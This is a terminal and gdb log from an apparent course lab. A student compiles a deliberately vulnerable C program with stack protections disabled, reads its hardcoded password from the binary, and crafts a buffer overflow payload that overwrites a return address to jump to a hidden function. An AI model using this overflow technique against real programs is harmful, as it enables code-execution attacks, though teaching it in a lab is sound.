@@ -1,0 +1,282 @@
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ gcc practice.c -o practice -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+practice.c: In function ‘main’:
+practice.c:18:13: warning: passing argument 1 of ‘check_pass’ from incompatible pointer type [-Wincompatible-pointer-types]
+  check_pass(argv[1]);
+             ^
+practice.c:4:6: note: expected ‘char *’ but argument is of type ‘char **’
+ void check_pass(char* str)
+      ^
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ ./practice dakjal
+Authenticated
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ gcc practice.c -o practice -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+practice.c: In function ‘main’:
+practice.c:18:13: warning: passing argument 1 of ‘check_pass’ from incompatible pointer type [-Wincompatible-pointer-types]
+  check_pass(argv[1]);
+             ^
+practice.c:4:6: note: expected ‘char *’ but argument is of type ‘char **’
+ void check_pass(char* str)
+      ^
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ gcc practice.c -o practice -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+practice.c: In function ‘main’:
+practice.c:18:13: warning: passing argument 1 of ‘check_pass’ from incompatible pointer type [-Wincompatible-pointer-types]
+  check_pass(argv[1]);
+             ^
+practice.c:4:6: note: expected ‘char *’ but argument is of type ‘char **’
+ void check_pass(char* str)
+      ^
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ ./practice password
+Authenticated
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ ./practice kdaflk
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ ./practice kdaflkjkfdkfkdjfkdj
+Segmentation fault (core dumped)
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ gdb practice -q
+Reading symbols from practice...done.
+(gdb) info functions
+All defined functions:
+
+File practice.c:
+void check_pass(char *);
+int main(int, char ***);
+
+Non-debugging symbols:
+0x080482ec  _init
+0x08048320  strcmp@plt
+0x08048330  strcpy@plt
+0x08048340  puts@plt
+0x08048350  __libc_start_main@plt
+0x08048370  _start
+0x080483a0  __x86.get_pc_thunk.bx
+0x080483b0  deregister_tm_clones
+0x080483e0  register_tm_clones
+0x08048420  __do_global_dtors_aux
+0x08048440  frame_dummy
+0x080484d0  __libc_csu_init
+0x08048530  __libc_csu_fini
+0x08048534  _fini
+(gdb) disass main
+Dump of assembler code for function main:
+   0x080484aa <+0>:	push   %ebp
+   0x080484ab <+1>:	mov    %esp,%ebp
+   0x080484ad <+3>:	mov    0xc(%ebp),%eax
+   0x080484b0 <+6>:	add    $0x4,%eax
+   0x080484b3 <+9>:	mov    (%eax),%eax
+   0x080484b5 <+11>:	push   %eax
+   0x080484b6 <+12>:	call   0x804846b <check_pass>
+   0x080484bb <+17>:	add    $0x4,%esp
+   0x080484be <+20>:	mov    $0x0,%eax
+   0x080484c3 <+25>:	leave  
+   0x080484c4 <+26>:	ret    
+End of assembler dump.
+(gdb) disass check_pass
+Dump of assembler code for function check_pass:
+   0x0804846b <+0>:	push   %ebp
+   0x0804846c <+1>:	mov    %esp,%ebp
+   0x0804846e <+3>:	sub    $0x10,%esp
+   0x08048471 <+6>:	movl   $0x8048550,-0x4(%ebp)
+   0x08048478 <+13>:	pushl  0x8(%ebp)
+   0x0804847b <+16>:	lea    -0xe(%ebp),%eax
+   0x0804847e <+19>:	push   %eax
+   0x0804847f <+20>:	call   0x8048330 <strcpy@plt>
+   0x08048484 <+25>:	add    $0x8,%esp
+   0x08048487 <+28>:	pushl  -0x4(%ebp)
+   0x0804848a <+31>:	lea    -0xe(%ebp),%eax
+   0x0804848d <+34>:	push   %eax
+   0x0804848e <+35>:	call   0x8048320 <strcmp@plt>
+   0x08048493 <+40>:	add    $0x8,%esp
+   0x08048496 <+43>:	test   %eax,%eax
+   0x08048498 <+45>:	jne    0x80484a7 <check_pass+60>
+   0x0804849a <+47>:	push   $0x8048559
+   0x0804849f <+52>:	call   0x8048340 <puts@plt>
+   0x080484a4 <+57>:	add    $0x4,%esp
+   0x080484a7 <+60>:	nop
+   0x080484a8 <+61>:	leave  
+   0x080484a9 <+62>:	ret    
+End of assembler dump.
+(gdb) x/s 0x8048550
+0x8048550:	"password"
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ gcc practice.c -o practice -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+practice.c: In function ‘main’:
+practice.c:23:13: warning: passing argument 1 of ‘check_pass’ from incompatible pointer type [-Wincompatible-pointer-types]
+  check_pass(argv[1]);
+             ^
+practice.c:9:6: note: expected ‘char *’ but argument is of type ‘char **’
+ void check_pass(char* str)
+      ^
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ gdb practice -qReading symbols from practice...done.
+(gdb) info functions
+All defined functions:
+
+File practice.c:
+void check_pass(char *);
+void deadcode();
+int main(int, char ***);
+
+Non-debugging symbols:
+0x080482ec  _init
+0x08048320  strcmp@plt
+0x08048330  strcpy@plt
+0x08048340  puts@plt
+0x08048350  __libc_start_main@plt
+0x08048370  _start
+0x080483a0  __x86.get_pc_thunk.bx
+0x080483b0  deregister_tm_clones
+0x080483e0  register_tm_clones
+0x08048420  __do_global_dtors_aux
+0x08048440  frame_dummy
+0x080484e0  __libc_csu_init
+0x08048540  __libc_csu_fini
+0x08048544  _fini
+(gdb) disass check_pass
+Dump of assembler code for function check_pass:
+   0x0804847e <+0>:	push   %ebp
+   0x0804847f <+1>:	mov    %esp,%ebp
+   0x08048481 <+3>:	sub    $0x10,%esp
+   0x08048484 <+6>:	movl   $0x8048571,-0x4(%ebp)
+   0x0804848b <+13>:	pushl  0x8(%ebp)
+   0x0804848e <+16>:	lea    -0xe(%ebp),%eax
+   0x08048491 <+19>:	push   %eax
+   0x08048492 <+20>:	call   0x8048330 <strcpy@plt>
+   0x08048497 <+25>:	add    $0x8,%esp
+   0x0804849a <+28>:	pushl  -0x4(%ebp)
+   0x0804849d <+31>:	lea    -0xe(%ebp),%eax
+   0x080484a0 <+34>:	push   %eax
+   0x080484a1 <+35>:	call   0x8048320 <strcmp@plt>
+   0x080484a6 <+40>:	add    $0x8,%esp
+   0x080484a9 <+43>:	test   %eax,%eax
+   0x080484ab <+45>:	jne    0x80484ba <check_pass+60>
+   0x080484ad <+47>:	push   $0x804857a
+   0x080484b2 <+52>:	call   0x8048340 <puts@plt>
+   0x080484b7 <+57>:	add    $0x4,%esp
+   0x080484ba <+60>:	nop
+   0x080484bb <+61>:	leave  
+   0x080484bc <+62>:	ret    
+End of assembler dump.
+(gdb) info functiosn
+Undefined info command: "functiosn".  Try "help info".
+(gdb) info functions
+All defined functions:
+
+File practice.c:
+void check_pass(char *);
+void deadcode();
+int main(int, char ***);
+
+Non-debugging symbols:
+0x080482ec  _init
+0x08048320  strcmp@plt
+0x08048330  strcpy@plt
+0x08048340  puts@plt
+0x08048350  __libc_start_main@plt
+0x08048370  _start
+0x080483a0  __x86.get_pc_thunk.bx
+0x080483b0  deregister_tm_clones
+0x080483e0  register_tm_clones
+0x08048420  __do_global_dtors_aux
+0x08048440  frame_dummy
+0x080484e0  __libc_csu_init
+0x08048540  __libc_csu_fini
+0x08048544  _fini
+(gdb) disass deadcode
+Dump of assembler code for function deadcode:
+   0x0804846b <+0>:	push   %ebp
+   0x0804846c <+1>:	mov    %esp,%ebp
+   0x0804846e <+3>:	push   $0x8048560
+   0x08048473 <+8>:	call   0x8048340 <puts@plt>
+   0x08048478 <+13>:	add    $0x4,%esp
+   0x0804847b <+16>:	nop
+   0x0804847c <+17>:	leave  
+   0x0804847d <+18>:	ret    
+End of assembler dump.
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ ./practice $(python -c 'print("A"*14 + "A"*4 + "\x6b\x84\x04\x")')
+ValueError: invalid \x escape
+Segmentation fault (core dumped)
+user@user-VirtualBox:~/Documents/ENPM-691/Demos/Demo Midterm$ gdb practice -q
+Reading symbols from practice...done.
+(gdb) disass check_pass
+Dump of assembler code for function check_pass:
+   0x0804847e <+0>:	push   %ebp
+   0x0804847f <+1>:	mov    %esp,%ebp
+   0x08048481 <+3>:	sub    $0x10,%esp
+   0x08048484 <+6>:	movl   $0x8048571,-0x4(%ebp)
+   0x0804848b <+13>:	pushl  0x8(%ebp)
+   0x0804848e <+16>:	lea    -0xe(%ebp),%eax
+   0x08048491 <+19>:	push   %eax
+   0x08048492 <+20>:	call   0x8048330 <strcpy@plt>
+   0x08048497 <+25>:	add    $0x8,%esp
+   0x0804849a <+28>:	pushl  -0x4(%ebp)
+   0x0804849d <+31>:	lea    -0xe(%ebp),%eax
+   0x080484a0 <+34>:	push   %eax
+   0x080484a1 <+35>:	call   0x8048320 <strcmp@plt>
+   0x080484a6 <+40>:	add    $0x8,%esp
+   0x080484a9 <+43>:	test   %eax,%eax
+   0x080484ab <+45>:	jne    0x80484ba <check_pass+60>
+   0x080484ad <+47>:	push   $0x804857a
+   0x080484b2 <+52>:	call   0x8048340 <puts@plt>
+   0x080484b7 <+57>:	add    $0x4,%esp
+   0x080484ba <+60>:	nop
+   0x080484bb <+61>:	leave  
+   0x080484bc <+62>:	ret    
+End of assembler dump.
+(gdb) b *0x08048492
+Breakpoint 1 at 0x8048492: file practice.c, line 13.
+(gdb) b *0x08048497
+Breakpoint 2 at 0x8048497: file practice.c, line 13.
+(gdb) r $(python -c 'print("A"*14 + "A"*4 + "\x6b\x84\x04\x08")')
+Starting program: /home/user/Documents/ENPM-691/Demos/Demo Midterm/practice $(python -c 'print("A"*14 + "A"*4 + "\x6b\x84\x04\x08")')
+
+Breakpoint 1, 0x08048492 in check_pass (
+    str=0xbffff28c 'A' <repeats 18 times>, "k\204\004\b") at practice.c:13
+warning: Source file is more recent than executable.
+13		strcpy(buffer, str);
+(gdb) x/20 $esp
+0xbfffefc4:	-1073745970	-1073745268	134513921	-1208228900
+0xbfffefd4:	134513180	134514033	-1073745944	134513870
+0xbfffefe4:	-1073745268	0	-1209911737	2
+0xbfffeff4:	-1073745788	-1073745776	0	0
+0xbffff004:	0	-1208229888	-1207960572	-1207963648
+(gdb) x/1xw $ebp
+0xbfffefdc:	0xbfffefe8
+(gdb) x/1xw $ebp+4
+0xbfffefe0:	0x080484ce
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048497 in check_pass (str=0xbffff200 "\350\003")
+    at practice.c:13
+13		strcpy(buffer, str);
+(gdb) x/1xw $ebp+4
+0xbfffefe0:	0x0804846b
+(gdb) disass deadcode
+Dump of assembler code for function deadcode:
+   0x0804846b <+0>:	push   %ebp
+   0x0804846c <+1>:	mov    %esp,%ebp
+   0x0804846e <+3>:	push   $0x8048560
+   0x08048473 <+8>:	call   0x8048340 <puts@plt>
+   0x08048478 <+13>:	add    $0x4,%esp
+   0x0804847b <+16>:	nop
+   0x0804847c <+17>:	leave  
+   0x0804847d <+18>:	ret    
+End of assembler dump.
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcmp_sse4_2 () at ../sysdeps/i386/i686/multiarch/strcmp-sse4.S:262
+262	../sysdeps/i386/i686/multiarch/strcmp-sse4.S: No such file or directory.
+(gdb) r $(python -c 'print("A"*14 + "A"*4 + "\x6b\x84\x04\x08")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/Documents/ENPM-691/Demos/Demo Midterm/practice $(python -c 'print("A"*14 + "A"*4 + "\x6b\x84\x04\x08")')
+
+Breakpoint 1, 0x08048492 in check_pass (
+    str=0xbffff28c 'A' <repeats 18 times>, "k\204\004\b") at practice.c:13
+13		strcpy(buffer, str);
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 11535] will be killed.
+
+Quit anyway? (y or n) y
+
